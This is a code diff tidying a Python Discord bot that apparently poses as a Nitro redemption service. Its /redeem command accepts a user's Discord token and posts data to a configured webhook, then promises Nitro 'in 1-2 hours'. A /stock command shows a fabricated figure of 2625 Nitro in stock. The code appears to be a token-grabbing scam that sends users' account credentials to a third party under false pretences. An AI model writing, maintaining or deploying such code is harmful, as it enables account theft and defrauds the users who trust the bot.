@@ -6,15 +6,14 @@ import os
 from colorama import *
 from pystyle import *
 
-
 with open("config.json", "r") as f:
     config = json.load(f)
 
 webhook_url = config["webhook_url"]
 bot_token = config["bot_token"]
-# Api updated day ------
+
 intents = discord.Intents.default()
-intents.typing = False  
+intents.typing = False
 
 bot = commands.Bot(command_prefix='/', intents=intents)
 
@@ -31,7 +30,6 @@ kost = f"""
 async def on_ready():
     Anime.Fade(Center.Center(kost), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)
     print(f"Bot connected as {bot.user.name}")
-
     print(f"-----------------------Bot connected as {bot.user.name}----------------------")
 
 
@@ -45,16 +43,19 @@ async def redeem(ctx: commands.Context, token: str, month: str):
     }
     response = requests.post(webhook_url, json=webhook_data)
     if response.status_code == 204:
-        embed = discord.Embed(title="Nitro Activation", description="Nitro should be active in 1-2 hours If the token its valid", color=discord.Color.green())
-        
-   
-    embed = discord.Embed(
-        title="Activated",
-        description=f"**Your Nitro will be activeted in 1-2h if the tokens its valid**",
-        color=0xED00FF
-    )
+        embed = discord.Embed(
+            title="Nitro Activation",
+            description="Nitro should be active in 1-2 hours if the token is valid",
+            color=discord.Color.green()
+        )
+    else:
+        embed = discord.Embed(
+            title="Activation Failed",
+            description="Failed to activate Nitro. Please check the token.",
+            color=discord.Color.red()
+        )
     await ctx.send(embed=embed)
-    
+
 
 @bot.slash_command(
     name="stock",
@@ -63,13 +64,10 @@ async def redeem(ctx: commands.Context, token: str, month: str):
 async def stock(ctx):
     embed = discord.Embed(
         title="Stock",
-        description=f"**2625 Nitro in stock:** ",
-        color=0xED00FF
+        description="2625 Nitro in stock",
+        color=discord.Color.purple()
     )
-
-    await ctx.respond(embed=embed)
-    
-    
+    await ctx.send(embed=embed)
 
 
 bot.run(bot_token)
